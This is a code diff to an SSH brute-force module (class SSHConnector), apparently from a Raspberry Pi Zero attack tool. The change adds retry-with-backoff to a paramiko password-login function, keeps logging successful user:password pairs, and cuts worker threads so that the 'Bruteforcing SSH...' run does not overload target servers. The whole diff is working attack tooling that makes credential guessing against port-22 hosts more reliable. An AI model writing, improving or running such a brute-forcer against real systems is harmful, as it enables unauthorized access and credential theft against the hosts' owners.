@@ -126,33 +126,49 @@ class SSHConnector:
         self.scan["Ports"] = self.scan["Ports"].astype(str)
         self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]
 
-    def ssh_connect(self, adresse_ip, user, password):
-        """Attempt to connect to SSH using only the supplied credentials."""
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    def ssh_connect(self, adresse_ip, user, password, max_retries=3):
+        """Attempt to connect to SSH using only the supplied credentials.
+        
+        Retries on banner/connection errors (server overload) with exponential backoff.
+        Auth failures are NOT retried — they indicate wrong credentials.
+        """
+        import time as _time
 
-        try:
-            ssh.connect(
-                adresse_ip,
-                username=user,
-                password=password,
-                port=22,
-                timeout=15,
-                auth_timeout=15,
-                banner_timeout=15,
-                look_for_keys=False,  # Prevent consuming auth attempts with key probing
-                allow_agent=False
-            )
-            logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
-            return True
-        except paramiko.AuthenticationException:
-            logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
-            return False
-        except (socket.error, paramiko.SSHException) as exc:
-            logger.warning(f"SSH connection error to {adresse_ip}: {exc}")
-            return False
-        finally:
-            ssh.close()
+        for attempt in range(1, max_retries + 1):
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+            try:
+                ssh.connect(
+                    adresse_ip,
+                    username=user,
+                    password=password,
+                    port=22,
+                    timeout=15,
+                    auth_timeout=15,
+                    banner_timeout=20,
+                    look_for_keys=False,  # Prevent consuming auth attempts with key probing
+                    allow_agent=False
+                )
+                logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
+                return True
+            except paramiko.AuthenticationException:
+                logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
+                return False
+            except (socket.error, paramiko.SSHException) as exc:
+                # Banner / connection errors → server may be overloaded, retry with backoff
+                if attempt < max_retries:
+                    backoff = attempt * 2  # 2s, 4s, 6s
+                    logger.debug(f"SSH connection error to {adresse_ip} (attempt {attempt}/{max_retries}): {exc} — retrying in {backoff}s")
+                    _time.sleep(backoff)
+                    continue  # retry the loop
+                else:
+                    logger.warning(f"SSH connection error to {adresse_ip} after {max_retries} attempts: {exc}")
+                    return False
+            finally:
+                ssh.close()
+        # All retries exhausted without success or definitive auth failure
+        return False
 
     def worker(self, progress, task_id, success_flag):
         """
@@ -217,7 +233,7 @@ class SSHConnector:
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
             
-            for _ in range(6):  # Adjust the number of threads based on the RPi Zero's capabilities
+            for _ in range(2):  # Reduced from 6 to prevent SSH banner overload on targets
                 t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                 t.start()
                 threads.append(t)
